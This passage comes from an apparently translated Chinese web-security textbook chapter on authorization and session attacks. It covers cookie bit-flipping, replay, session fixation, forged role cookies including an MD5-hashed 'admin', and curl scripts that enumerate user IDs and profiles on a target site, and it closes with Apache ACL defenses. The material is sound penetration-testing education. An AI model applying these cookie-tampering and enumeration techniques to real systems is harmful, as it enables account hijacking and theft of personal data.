- 最后 2 个字节是未知的。这个数据很短，因此我们可以猜测它仅仅是一个计数器或者类似变化的值，但这不代表了很多信息。它也可能是前面数据的一个校验和，用

来保证没有人篡改过 Cookie。

利用这些信息，攻击者可以执行“位翻转”（bit flipping）攻击：试着去改变加密字符串的部分内容，并监控应用程序性能的改变。让我们看看一个 Cookie 示例和三次修改：

Original: 4zD8AEYhcAvfqpSY3F0tMGbm3
Modification 1: 4zD8AEYhcAAAAAAAAAAAaam3
Modification 2: 4zD8AEYhcBvfqpSY3F0tMGbm3
Modification 3: 4zD8AEYhcAvfqpSYAvfqpSYm3

我们将注意力集中在攻击静态的 14 位长的字段上。首先，我们尝试全部用一样的字符，如果 Cookie 在登录页面仍被接受，我们就会知道，服务器并不检查这部分数据来作为认证证书。如果 Cookie 在查看用户配置的页面被拒绝，那么我们就可以推测这部分数据中包含了一些用户信息。

在第二次修改中，我们改变了一个字符，然后提交 Cookie 到应用程序的不同部分，来看看这个 Cookie 会在哪儿被接受，在哪儿被拒绝。也许它代表了一个标志，程序以此来区分一般用户和超级用户，而你一点儿也不知道（但你可能非常走运！）

在第三次修改中，我们重复了字符串的前一半。也许格式是用户名：密码。如果我们做这样的改变，猜测输出是用户名：密码，而登录页面拒绝它，那么也许我们所处的是正确的追踪方向。这很快就可能成为一项漫长的、无止境的猜测工作。

对于加密和解密的工具，试试 UNIX 的 crypt()函数，Perl 的 Crypt::DES 模块和 mcrypt 库（http://mcrypt.hellug.gr/）。

#### 5.3.3 捕获/重放

可以看到，预测攻击通常是全是或全非（all-or-none）的效果：要么应用程序开发者犯了一些错误，攻击者通过直觉猜测和/或者稍微做自动化分析就能轻松得手；要么存在一些攻击者完全无法辨认的值，他们不得不改用其他的攻击方法。

一种攻击者用来绕过分析令牌的所有复杂工作的方法，就是简单地重放其他用户的令牌给应用程序。如果成功，攻击者便可以冒充成那个用户。

这种捕获/重放攻击和预测攻击有一个关键的区别：前者不是通过猜测或逆向工程获取一个合法的令牌，而是用其他一些方法取得一个令牌。这里有几种经典的方法可以采用，包括窃听、中间人方法和社会工程攻击。我们来讨论一些例子。

窃听（Eavesdrop）是对所有基于网络的应用程序普遍存在的威胁。流行的免费网络监控工具，诸如 Ethereal 和 Ettercap 可以在线路上轻易地嗅探一个 Web 应用会话，暴露和重放所有的授权数据。

通过在合法客户端和应用程序之间放置“中间人”，可以实现同样的效果。举个例子，

如果攻击者攻击了某个大型 ISP 的一个代理服务器，那么他可以访问使用该代理的所有用户的会话 ID。即使代理执行了 SSL，也保护不了数据。

最后，一个简单但有效地获取令牌的方法，就是直接询问用户。就像我们在前面关于查询字符串中敏感数据的讨论那样，不知情的用户会上当，他们可能通过 E-mail 发送包含这类数据的 URI。另一个提醒是，在查询字符串中保存敏感的数据是很危险的。

#### 5.3.4 会话定置

2002年12月，ACROS公布了一篇关于会话定置（session fixation）的论文，会话定置是指这样一类攻击：攻击者选择某个会话ID作为攻击对象，而不是用其他方法猜测或者捕获它（链接请参见“参考和进一步阅读”）。

会话定置的工作流程如下:

- 攻击者登录到有漏洞的应用程序，建立一个合法会话 ID，该会话 ID 是用来 “诱骗”受害者的。

然后攻击者欺骗受害者用同样的会话ID登录到同样的应用程序（ACROS的论文讨论了实现的多种方法，但最简单的还是通过E-mail给受害者发送一个到应用程序的链接，在该链接的查询字符串中带有“诱骗”的会话ID）。

一旦受害者登录到应用程序，攻击者重放同样的会话ID，就可以有效地劫持受害者的会话（也可以说是受害者登录到攻击者的会话）。

这类攻击的另一种形式不需要一个分开的受害者会话。在这种形式中，攻击者只需将他们自己的会话的失效时间重置为将来的某个时候，就有可能维持为应用程序的授权用户。该“固定”的访问令牌成为了该应用程序的有效永久后门。如果基于 Web 的应用程序可以用来提供对 IT 系统的管理访问权限，这是非常糟糕的事情。

会话定置看起来使攻击者的梦想成真，但是该攻击的很多方面使得它不像最初宣扬的那么吸引人：

攻击者必须说服受害者相信，让他们启动一个URI，用“诱骗”的会话ID登录到应用程序。如果你可以欺骗某人载入一个URI，那么你就可以做很多比重置一个会话ID更严重的事情。

然后攻击者必须在受害者注销或者会话期满失效前，采用同样的会话ID，同时登录到系统中（当然，如果Web应用程序有漏洞，不去正确地处理过期会话的话，那么这便成了一个不受限制的窗口）。

针对会话定置攻击的对抗措施也非常简单：为每个成功的登录（即，在认证后）生成新的会话ID，不要图方便接受客户端提供的会话ID。最后要确保使用了服务端的逻辑会话超时，也要确保设置了绝对的会话期满超时。这样就可以防止用户在他们的账户过期一年

后突然回到你的系统。

注意 每种对抗措施都只是应用程序层面的，Web 平台是不会保护你免受会话重置攻击的。

### 5.4 授权攻击案例分析

现在你已经知道了攻击 Web 应用程序授权和会话管理的基本技术。那么让我们看一些现实世界中来自于笔者咨询工作的例子，阐明如何糅合各种技术来识别和攻击授权漏洞。

由于整体安全意识的提高, 以及诸如 ASP.NET 和 J2EE 的 COTS 授权/会话管理框架的大量使用, 我们在下面描述的很多情况会变得越来越少见。但是, 仍有大量的站点存在这些问题。

注意 显然,出于保护隐私的目的,本章中出现的名字和确切的技术细节已经做了改变。

#### 5.4.1 水平权限提升

水平权限提升是利用授权漏洞，得到应用程序中对等用户的相同或更低的权限（对应的更危险的是垂直权限提升到更高等级，我们会在下一节讨论）。让我们以一个假想的Web购物应用程序为例子，看看识别该授权漏洞的过程。

首先，设置我们的浏览器，利用在第1章中讨论过的任一HTTP分析工具，以便观察并操纵所有对Web应用程序的输入和输出。然后我们浏览该站点，立即开始识别站点是如何创建新账户的。这相当简单，因为“创建新账户”功能就在用户登录界面上（这些应用程序常常渴望有新的购物者注册），如图5-7所示。

 </div>

就像大多数 Web 购物应用程序一样，这个程序也给你一个账户创建表单，询问各种个人信息。要确认恰当地填入了所有的信息（没办法！）。在接近整个流程结束时，我们会遇到一个“完成”或者“创建账户”的选项，但不要马上点击它，而是到 HTTP 分析工具中，清除所有的请求，这样我们会获得一个干净的面板。现在才是继续的时候，单击按钮，完成账户的创建，屏幕会如图 5-8 所示。

 </div>

使用我们的分析工具，仔细观察以原始的 HTTP 格式发送到服务器的请求。下面是创建账户真正发送的东西：

POST /secure/MyAcctBilling.asp HTTP/1.1
Host: secure2.site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 414
Cookie: 20214200UserName=foo%40foo%2Ecom; 20214200FirstName=Michael;
BIGipServerSecure2.TEAM.WebHosting=1852316332.20480.0000; LastURL=
http%3A%2F%2Fwww%2Esite%2Ecom; ASPSESSIONIDQAASCCQS=
GKEMINACKANKBNLFJAPKNLEM
stealth=1&RegType=1&UserID=&Salutation=Mr&FirstName=Michael&LastName=
Holmes&EmailAddress=foo@foo.com&Password1=testpassword&Password2=
testpassword&DayPhone1=678&DayPhone2=555&DayPhone3=555&AltPhone1=
&AltPhone2=&AltPhone3=&Address1=294+forest+break+lane&Address2=&City=
atlanta&State=GA&Country=United+States&PostalCode=30338&CCName=0&CCNum=
&CCExpMonth=0&CCExpYear=0000&update_billing_info=on&submit.x=
43&submit.y=13

##### 而下面是来自服务器的响应:

HTTP/1.x 302 Object moved
Set-Cookie: BIGipServerSecure2.TEAM.WebHosting=1852316332.20480.0000; path=/
Set-Cookie: UserID=2366239; path=/
Set-Cookie: ShopperID=193096346; path=/

Set-Cookie: 20214200UserName=foo@foo.com; path=/
Date: Wed, 12 Oct 2005 18:13:23 GMT
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
Location: https://secure2.site.com/secure/MyAcctBillingSuccess.asp?r=1
Content-Length: 185
Content-Type: text/html
Cache-Control: private

就像在本章前面提过的那样，Cookie 经常包含有授权信息，用以识别会话。因此我们简要地记下响应中 Set-Cookie 值。它们归纳于表 5-7 中。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>Cookie 名</td><td style='text-align: center; word-wrap: break-word;'>值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>20214200UserName</td><td style='text-align: center; word-wrap: break-word;'>foo%40foo%2Ecom</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>20214200FirstName</td><td style='text-align: center; word-wrap: break-word;'>Michael</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>BIGipServerSecure2.TEAM.WebHosting</td><td style='text-align: center; word-wrap: break-word;'>1852316332.20480.0000</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LastURL</td><td style='text-align: center; word-wrap: break-word;'>http%3A%2F%2Fwww%2Esite%2Ecom</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ShopperID</td><td style='text-align: center; word-wrap: break-word;'>193096346</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ASPSESSIONIDQAASCCQS</td><td style='text-align: center; word-wrap: break-word;'>GKEMINACKANKBNLFJAPKNLEM</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UserID</td><td style='text-align: center; word-wrap: break-word;'>2366239</td></tr></table>

注意，ShopperID 和 UserID 看起来非常可疑。它们的名字显然是关于授权的，而且它们的值是数字，这意味着它们很可能会受到简单的操纵攻击（如连续迭代，等等）。

现在,我们的工作是判断这些Cookie实际上是用来做什么的,以及ShopperID和UserID令牌是否正如我们所想的那样。为了达到这个目的,我们需要重新传送这些Cookie给应用程序,希望可以修改某些功能,以获得权限提升。就像在本章前面提到的那样,Web授权最常被滥用的方面之一,是账户管理页面,特别是那些自助功能。根据这一点,我们直接进入该Web应用程序中查看和修改账户信息的页面。我们使用SPI Dynamics的SPI ToolKit HTTP Editor（购买了WebInspect产品的用户都可以免费获取）,在浏览HTML图形界面的同时,分析该界面的底层HTTP,如图5-9所示。

使用该自助功能，我们可以用前面得到的授权 Cookie 运行几个重放测试。Cookie 在 HTTP 头中，从客户端到服务器端重放时像下面这样：

Cookie: 20214200UserName=foo%40foo%2Ecom; 20214200FirstName=Michael;
BIGipServerSecure2.TEAM.WebHosting=1852316332.20480.0000; LastURL=
http%3A%2F%2Fwww%2Esite%2Ecom; ShopperID=193096346;
ASPSESSIONIDQAASCCQS=GKEMINACKANKBNLFJAPKNLEM; UserID=2366239

 </div>

为了检验我们的猜测——ShopperID 和 UserID 携带了授权数据，现在我们开始逐一删除 Cookie，并发送请求回去。当我们删除 UserID Cookie 时，服务器仍响应如图 5-9 所示的账户注册页面。因此，该 Cookie 对我们当前的任务并不重要。我们对每个 Cookie 重复前面的步骤，直到我们最终删除的 Cookie 使服务器响应带有 HTTP 302 重定向。这表示 Web 服务器在说“嘿，我不知道你是谁，请回到登录页面。”换句话说，我们删除的令牌对授权来说是必要的。当我们删除 ShopperID Cookie 时，我们终于收到如下的响应：

HTTP/1.1 302 Object moved
Date: Wed, 12 Oct 2005 18:36:06 GMT
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
Location: /secure/MyAcctLogin.asp?sid=

Content-Length: 149
Content-Type: text/html
Set-Cookie: ASPSESSIONIDQAASCCQS=OOEMINACOANKOLIIHMDAMFGF; path=/
Cache-control: private

这告诉我们 ShopperID Cookie 最可能是应用程序的授权令牌。

注意 我们实际上发现该站点的 BIGipServer cookie 也会导致授权失败；但是，因为我们知道 BIG-IP 是一个来自 F5 网络公司的 Web 负载均衡产品，所以我们忽略它。但是我们需要随后重放 BIGip 令牌，因为与 Web 站点通信时它是必要的。

到现在，通过简单地改变 ShopperID Cookie 的值并重放给服务器，我们就可以测试它的漏洞了。因为之前创建了账户，所以我们减少其编号值，观察是否可以访问在我们之前所创建账户的信息。我们使用该 Cookie 并将 ShopperID 的值从 193096346 改变为 193096345（注意我们重放了一模一样的 BIGipCookie，但对目标来说只是偶然的动作）。在改变前，客户端的 Cookie 头看起来是下面这个样子：

Cookie: BIGipServerSecure2.TEAM.WebHosting=1852316332.20480.0000;
ShopperID=193096346;

在改变后，它看起来像这样（只有一个数不同）：

Cookie: BIGipServerSecure2.TEAM.WebHosting=1852316332.20480.0000;
ShopperID=193096345;

我们发送第二个，也是减少后的值到服务器，并检查是否返回了相同账户的信息。成功了！图 5-10 显示的是账户 “Emily Sima” 的数据。我们刚刚确认了一个水平权限提升漏洞。攻击者现在就可以枚举每个账户并获得个人数据，甚至冒充任意用户获得他们账户的完全权限。

#### 5.4.2 垂直权限提升

垂直权限提升是升级到更高账户状态或获得更高的许可级别。有四种典型的情况可以导致垂直权限提升。

用户可更改角色 应用程序识别出在某种程度上可以被用户改变的角色。

○ 劫持账号 被劫持的账号通过垂直权限提升具备更高的权限。

利用其他安全漏洞 通过其他安全漏洞到管理员区域改变权限，从而获取访问权。

☐ 不安全的管理功能 管理员功能没有恰当地授权。

让我们看看真实环境下每种情况的例子。

 </div>

##### 用户可改变角色

就像我们在本章中多次看到的那样，很多 Web 应用程序在用户可修改的地方保存许可等级或角色等级的授权数据。我们刚才看了一个将角色保存在 Cookie 中的 Web 购物应用程序例子。为了介绍一个类似的垂直提升的例子，我们考虑一个假想的 Web 应用程序，该程序带有一个有特权的管理接口：http://www.site.com/siteAdmin/menu.aspx。当我们尝试正常访问该页面时，它只是重定向回管理员登录页面。通过分析 HTTP 请求，我们发现其传递了下面这个 Cookie：

Cookie: Auth=

897ec5aef2914fd153091011a4f0f1ca8e64f98c33a303eddfbb7ea29d217b34; -
563131=Roles=End. User; K=HomePageHits=True; ASP.NET_SessionId=
dbii2555qecqfimijxzfaf55

值 “Roles=End User” 几乎是完全暴露了该应用程序，并把授权参数开放给客户操纵。我们开始改变这个值，并请求这个页面，看是否有任何不同。比如，我们尝试了 “Roles=admin”，“Roles=root” 和 “Roles=administrator”。在几次失败后，我们进一步考虑命名习惯，尝试 “Roles=Admin User”，然后就可以到管理员页面访问了。令人惊讶的是，我们的 Web 应用程序测试经验发现了一个更简单的方法，只用在 URL 后附加 “admin=true” 或 “admin=1” 就可以生效了。

让我们看一个更有挑战性的例子。在下面这个假想的 Web 应用中，我们作为一个普通用户登录到程序中，发送的 Cookie 与下面这个类似：

Cookie: ASPSESSIONIDAACAACDA=AJBIGAJCKHPMDFLLMKNFLFME; rC=X=
C910805903&Y=1133214680303; role=ee11cbb19052e40b07aac0ca060c23ee

我们立即注意到了“role=”语法，但没有考虑太久，因为这个值是被加密了的（又是数字字母的集合！）。在接下来的垂直权限提升测试中，为了进行差异分析，我们创建了第二个账户（就像本章前描述的那样）。当我们登录第二个账户时，Cookie如下：

Cookie: ASPSESSIONIDAACAACDA=KPCIGAJCGBODNLNMBIPBOAHI; rC=C=0&T=1133214613838&V=1133214702185; role=ee11cbb19052e40b07aac0ca060c23ee

发现了什么不寻常的东西吗？角色 Cookie 的值和我们第一个账户的值是一样的，它不是随机的值，而是一个确切的值。事实上，当更深入地观察后，会发现它像一个 MD5 哈希。数一下值中的字符串，是 32 个字符。由先前我们关于会话 ID 指纹探测讨论中所描述的特征得知，一个 32 位的值是表示一个 MD5 哈希的规范方法（是对一个标准 128 位 MD5 哈希的十六进制表示）。到现在，我们认为应用程序对用户使用一个固定的角色值，然后用 MD5 算法对它做哈希。

狮子老虎和密码，天啊！不过等一下，我们本质上进行的是和前面一样的权限提升攻击。改变 Cookie 为 “role=admin”，只不过不是用明文，而是用 MD5 对字符串 “admin” 做哈希。这样我们发送的 Cookie 如下：

Cookie: ASPSESSIONIDAACAACDA=KPCIGAJCGBODNLNMBIPBOAHI; rC=C=0&T=1133214613838&V=1133214702185; role=21232f297a57a5a743894a0e4a801fc3

再说一次，上面“role=”的值是单词 admin 的 MD5 哈希。

当我们用这个 Cookie 请求主账号界面时，应用程序发回一个 302 重定向回登录界面——没有成功。在对 “administrator” 和 “root” 等字符串做 MD5 哈希，手工额外尝试了几次之

后，我们决定写一个脚本来完成从一个常见用户账号名字典文件中读取信息的操作，自动化该流程。如果应用程序返回一个不是 302 重定向的响应，那么我们就发现了一个正确的角色。这没有花太长时间；大约运行脚本五分钟后，我们发现“Supervisor”是一个合法的角色，并且可以作为超级用户访问应用程序。

#### 使用劫持账户

水平权限提升通常也容易实现垂直权限提升。比如，如果授权令牌通过连续的标识符来实现（就像在前面那个假想的 Web 购物站点例子中看到的那样），那么垂直提升就像猜测最小的合法账号 ID（通常就是超级用户）一样简单。更具体的来说，一个包含值“AuthID=32896”的 Cookie 可能代表用户 32896，而“AuthID=1”很可能是代表一个管理员。通常情况下，小账号 ID 代表应用程序的开发者或管理员，而且很多时候这些账号有更高的权限。在后面介绍使用 Curl 映射许可一节中，我们会用类似的序列猜测来讨论识别管理员账号的系统化方法。

#### 利用其他安全漏洞

这是一种假设的情况。通过其他安全漏洞，诸如 COST 组件中的缓冲区溢出或 SQL 注入进入系统，来提升你账号的权限。举个例子，在无处不在的 Web 统计页面中，暴露了一个不需要任何认证的管理接口，位于 http://www.site.com/cgi-bin/manager.cgi（在第 2 章中我们讨论过寻找 Web 统计页面的常用方法）。你不相信吗？不用怀疑——在我们多年的 Web 应用渗透测试经验中，这样的例子发生的太多了。

### 不安全的管理员功能

在以前的经历中，我们发现很多 Web 应用管理功能都没有认证或者没有正确的授权。

举个例子，考虑一个带有 POST 调用脚本 http://www.site.com/admin/utils/updatepdf.asp 的应用程序。很明显，管理脚本存储在这个目录中。或许像应用程序开发者想象的那样，脚本只能被需要认证的站点管理员访问到。显然，拙劣的潜在攻击者只需一点运气，猜测出目录的命名习惯，就可以轻松地发现/admin/utils 目录。对 updatepdf 脚本作一些简单分析，就可以知道它将一个 ID 数字和一个文件名作为参数，上传一个 PDF 文件到站点上。即使作为一个普通用户来运行，这个脚本也会替换当前提供给用户的任何 PDF 文件。你可以想象成这是一个内容管理角色。基于此脚本，可以进行拒绝服务攻击（Denial-of-Service）。更具破坏性的是，我们最终可以使用该 updatepdf 脚本来上传自己的 ASP 页面，几乎实现对服务器的完全控制。

#### 5.4.3 差异分析

我们已经在本章之前几次讨论了差异分析的概念（因为它和授权审计相关）。本质上

来说，它用不同的认证（或没认证的）账号爬行目标站点，记录如 Cookie 或其他授权/状态跟踪数据在参数上的不同。

我们最近的一次咨询经历强调了该技术的使用。我们签订合同并执行一次合法的评估。客户向我们提供了两组合法的证书：一个“标准”的应用程序用户和一个管理员用户。我们首先用标准用户的认证账号爬行站点，记录所有提交的页面和表单。然后我们用管理员用户的认证账号做同样的事情。之后我们对两组数据排序，计算每种情况提交的数据总数。结果如表5-8所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>数据类型</td><td style='text-align: center; word-wrap: break-word;'>标准用户</td><td style='text-align: center; word-wrap: break-word;'>管理员用户</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Form submissions</td><td style='text-align: center; word-wrap: break-word;'>6</td><td style='text-align: center; word-wrap: break-word;'>15</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Cookies</td><td style='text-align: center; word-wrap: break-word;'>8</td><td style='text-align: center; word-wrap: break-word;'>8</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Pages</td><td style='text-align: center; word-wrap: break-word;'>62</td><td style='text-align: center; word-wrap: break-word;'>98</td></tr></table>

基于该数据，最明显的攻击是使用标准用户账号，试图访问管理员的表单和页面。在这里，没那么容易成功；我们点击的页面看起来都做了很好的保护措施。

然后我们进一步观察，标准用户角色和管理员用户角色的会话管理是怎样的不同。如表 5-8 所示，标准用户和管理员用户两者都从应用程序获得相同数量的 Cookie。这意味着会话/角色授权可能与其中的一个 Cookie 有关。通过前面水平权限提升例子中演示的 Cookie 排除法，我们识别出一个看起来是执行授权功能的单独 Cookie。表 5-9 显示了标准用户和管理员用户两者的值。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>用户类型</td><td style='text-align: center; word-wrap: break-word;'>Cookie 值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Standard</td><td style='text-align: center; word-wrap: break-word;'>jonafid=833219244.213a72e5767c1c7a6860e199e2f2bfaa.0092.783823921</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Admin</td><td style='text-align: center; word-wrap: break-word;'>jonafid=833208193.dd5d520617fb26aeb18b8570324c0fcc.0092.836100218</td></tr></table>

接下来我们分析标准用户 Cookie 和管理员 Cookie 之间的不同。花几分钟时间看表 5-9 中的 Cookie，看你的想法能否和我们列在下面的东西一致：

○ Cookie 值通过句点分段。

○ 第一段，第三段和第四段长度都一样，而且都是数字。

○ 第二段可能是 MD5 哈希（它是 32 字节长，参见 “分析会话令牌” 一节）。

○ 每一段对每个用户都是同样长度的。

第一段的前三个数字对每个用户都是相同的。

虽然我们有用来生成第二段的算法，但上面粗略的分析并没有真正的揭示出任何有用

的信息，因此我们来做进一步地探查。我们系统地改变 Cookie 中的值，然后再次提交给应用程序。首先改变 Cookie 最后一段中的值，再改变前面的。表 5-10 给出了我们的一些测试结果。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>改变</td><td style='text-align: center; word-wrap: break-word;'>结果</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>添加一个字符 9</td><td style='text-align: center; word-wrap: break-word;'>应用程序错误“没有登录”</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>改变最后一个字符从 1 到 9</td><td style='text-align: center; word-wrap: break-word;'>登录状态没有明显的改变</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>改变倒数第二个字符</td><td style='text-align: center; word-wrap: break-word;'>同上</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>把所有的字符都改成 9</td><td style='text-align: center; word-wrap: break-word;'>同上</td></tr></table>

表 5-10 中的数据说明，Cookie 值的最后一段和授权没有太大的联系。

对 Cookie 中的每一段重复该流程，当这样做时，我们惊奇地发现似乎只有 Cookie 中的前 5 个字符才和授权状态相关。再次看一下表 5-9，标准用户账号和管理员用户账号在 Cookie 中前 5 个字符中的唯一区别是在第 5 个字符的位置：管理员用户是 0，而标准用户是 1。做了进一步的输入操纵后，我们随后发现第 5 个位置包含了连续递增的账号数值。通过改变这些数值，我们可以轻易地劫持其他用户的会话。

### 5.4.4 使用 Curl 映射许可

Curl 是一个非常理想的自动检测工具。例如，假设你在审计一个顺序增加用户 ID 数字的应用程序（我们之前是在哪儿见过这个的呢？），并且已经识别出了用户查看配置信息所必需的会话令牌：uid（一个数字用户 ID）和 sessid（会话 ID）。URL 请求是一个 GET 命令，传递如下的参数：menu=4（数字表示查看配置的菜单项），userID=uid（user ID 在 Cookie 和 URL 中传递），profile=uid（假设要查看的是用户自己的配置），以及 r=874bace2（当用户第一次登录时分配给会话的一个随机数）。因此，完整的请求如下所示：

GET /secure/display.php?menu=4&userID=24601&profile=24601&r=874bace2

Cookie: uid=24601; sessid=99834948209

我们已经确定，为了查看其他人的配置（包括改变其找回密码后发送提示信息的E-mail），可以在URL中更改profile和userID参数。我们知道用户ID编号是顺序递增的，但不知道哪个ID是属于应用程序管理员的。换句话说，我们需要确定哪个ID可以查看任意的配置。通过简单的手工测试可以发现，如果我们输入的profile和userID值不匹配，应用程序会返回“你没有权限查看该页”（You are not authorized to view this page），而一个成功的请求会返回“...的会员配置”；两者都返回一个200 HTTP码。我们将用两个Curl脚本来自动进行这个测试。

第一个 Curl 脚本用来判断哪个用户的 ID 可以看到我们的配置。如果某个用户 ID 可以查看我们的配置，那么他可能属于管理员组。下面这个脚本测试头 100 000 个用户 ID 编号：

#!/bin/sh
USERID=1
while [ $USERID -le 100000 ] ; do
    echo -e "$USERID *****\\n" >> results.txt
    'curl -v -G \
    -H 'Cookie: uid=$USERID; sessid=99834948209' \
    -d 'menu=4' \
    -d 'userID=$USERID' \
    -d 'profile=24601' \
    -d 'r=874bace2' \
    --url https://www.victim.com/ results.txt'
    echo -e "*****\\n\\n" >> results.txt
    UserID='expr $USERID + 1'
done
exit

当脚本执行完毕后，我们仍需要手工搜索 results.txt 文件，找出哪些是符合要求的。这非常简单，只要针对文件运行下 grep 来查找 “Membership profile for” 字段。在这个方案下，用户 ID 编号 1001，19293 和 43000 可以查看我们的配置——我们找到了三个管理员！

接下来，我们使用第二个脚本，通过递增检查信息，枚举出所有活动的用户 ID。这一次保持 userID 不变，增加 profile 的值。我们使用编号 19293 这个用户 ID 来作为管理员：

#!/bin/sh
PROFILE=1
while [ $PROFILE -le 100000 ] ; do
    echo -e "$PROFILE *****\n" >> results.txt
    `curl -v -G \
    -H 'Cookie: uid=19293; sessid=99834948209' \
    -d 'menu=4' \
    -d 'userID=19293' \
    -d 'profile=$PROFILE' \
    -d 'r=874bace2' \
    --url https://www.victim.com/ results.txt
    echo -e "*****\n\n" >> results.txt
    UserID='expr $PROFILE + 1'
done
exit

一旦这个脚本完成了运行，我们就可以枚举出这个应用程序中所有活动用户的配置信息。

再看一下 URL 的查询字符串参数（menu=4&userID=24601&profile=24601&r=874bace2），我们又想到了第三种攻击方法。到目前为止，我们只是以一个较低权限用户访问应用程序，即编号 24601 的用户 ID 只能访问有限的菜单项。另一方面，使用编号 19293 的 ID，作为管理员可能有更多的可用菜单选项。因为没有密码我们不能以管理员身份登录，但我们可以伪装成管理员，不过仅仅能够执行应用程序中为低权限用户设置的那部分功能。

第三种攻击非常简单，我们修改一下 Curl 脚本来枚举应用程序的 menu 值。由于我们不知道结果会是什么，所以我们创建这样一个脚本，从命令行接受 menu 值，然后将服务器的响应显示在屏幕上：

#!/bin/sh
# guess menu options with curl: guess.sh
curl -v -G \
-H 'Cookie: uid=19293; sessid=99834948209' \
-d 'menu=$1' \
-d 'userID=19293' \
-d 'r=874\pace2' \
--url https://www.victim.com/

下面显示了我们如何执行脚本:

$ ./guess.sh 4
$ ./guess.sh 7
$ ./guess.sh 8
$ ./guess.sh 32

 </div>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>菜单编号</td><td style='text-align: center; word-wrap: break-word;'>功能</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>1-3</td><td style='text-align: center; word-wrap: break-word;'>显示主页</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>4</td><td style='text-align: center; word-wrap: break-word;'>查看用户配置</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>8</td><td style='text-align: center; word-wrap: break-word;'>改变用户密码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>16</td><td style='text-align: center; word-wrap: break-word;'>搜索用户</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>32</td><td style='text-align: center; word-wrap: break-word;'>删除用户</td></tr></table>

在这个例子中，我们跳过了一些编号，但是，好像 2 的幂的数值（4，8，16，32）都返回一个不同的菜单。这是非常有用的结果。这说明应用程序使用 8 位掩码来确定一个特定的菜单。比如，用户配置菜单以二进制表示是 00000100（4），删除用户是 00100000（32）。掩码只是引用数据的一种方法。这个例子有两点很重要：第一，检查应用程序的所有参数，以便测试它们的所有功能；第二，寻找应用程序的内部规律，这些规律可能是命名习惯或

一个数字级数，就像我们这里所演示的一样。

我们还没有尝试最后一种攻击——枚举 sessid 的值。简单地改动一下这些 Curl 脚本就可以枚举合法的 sessid 了；我们在这里留给读者作为练习。

在结束讨论 Curl 前，我们研究一下该攻击为什么是有效的。

不健全的会话处理 应用程序追踪 sessid cookie 值和 URL 中 r 的值；但是，应用程序没有把任何一个值和用户 ID 编号对应起来。换句话说，一旦我们成功认证，需要维持的只是 sessid 和 r 这两个值。uid 和 userID 的值用来检查授权，也就是该账号能否访问某个特定的配置。不把授权令牌（uid，userID，sessid，r）绑定起来，我们就可以冒充其他用户并获得访问权限。如果在第一次建立会话开始，应用程序就检查 uid 的值是否和 sessid 匹配，那么应用程序就可以阻止该攻击，因为冒充者尝试给对应的 uid 使用错误的 sessid。

没有强制会话超时 即使六个小时后，应用程序也不会终止会话令牌（sessid）。这一点是可以利用的。因为从技术上来说，枚举 100000 用户时，会话始终存在。但是，应用程序也可以强制再加上一个时间限制，比如一个小时，并要求用户重新认证。这样做不能完全阻止攻击，但是可以在很大程度上减轻它。这可以保护用户在共享环境中，比如大学计算机实验室，不会被他人窃取会话；也可以阻止会话定置攻击，在会话定置攻击中，攻击者尝试将会话失效期限延伸至未来一个不可能的时间。

### 5.5 授权最佳实践

哇，我们已经讨论了很多 Web 应用授权攻击了。那么，如何防范这些技术的攻击呢？

在本章中，我们基本上把 Web 应用授权攻击分为两大阵营：服务器端的 ACL 攻击和客户端的令牌攻击。因此，我们关于对抗措施的讨论，也基于该分类分成两个部分。

在我们开始前，需要列举一下通常的授权最佳实践。就像我们在整个第2章中看到的那样，通过Web服务器漏洞（请参考第3章和第10章），输入验证攻击（第6章）和SQL注入（第7章）攻击者经常可以进行授权攻击，或者扩大这几类攻击的危害。因此，对这些潜在漏洞应用对抗措施，对有效地阻止授权攻击也可以起到积极的作用。

另一种最佳实践是为你的应用程序定义明确的、一致的访问策略。举个例子，设计用户数据库来保存针对应用程序功能的角色。角色可以被读取、创建、修改、删除和访问。用户的会话信息应该明确定义可以使用哪些角色。角色表看起来像一个矩阵，每一行定义一个用户，每一列定义他们的潜在角色。

#### 5.5.1 Web ACL 最佳实践

就像我们提到的那样，ACL，特别是文件系统 ACL，是 Web 应用授权中最常用的（虽然我们还会讨论其他对象的 ACL，比如下面将讨论的 HTTP 方法）。在本节中，我们将描述 Web ACL 配置的最佳实践，然后讨论如何在两大流行 Web 平台 Apache 和 IIS 上配置 ACL。

##### Apache 授权

Apache Web 服务器使用两种不同的指令来控制用户对特定 URL 的访问。当访问控制是基于文件路径时，使用的是“Directory”指令。比如，下面一组指令就可以限制对/admin URL 的访问。只有管理员组中合法的用户才可以访问该目录。注意，password 和 group 文件都不能存在于 Web 文档的根目录中。

<Directory /var/www/htdocs/admin>
AuthType Digest
AuthName "Admin Interface"
AuthUserFile /etc/apache/passwd/users
AuthGroupFile /etc/apache/passwd/groups
Require group admin
</Directory>

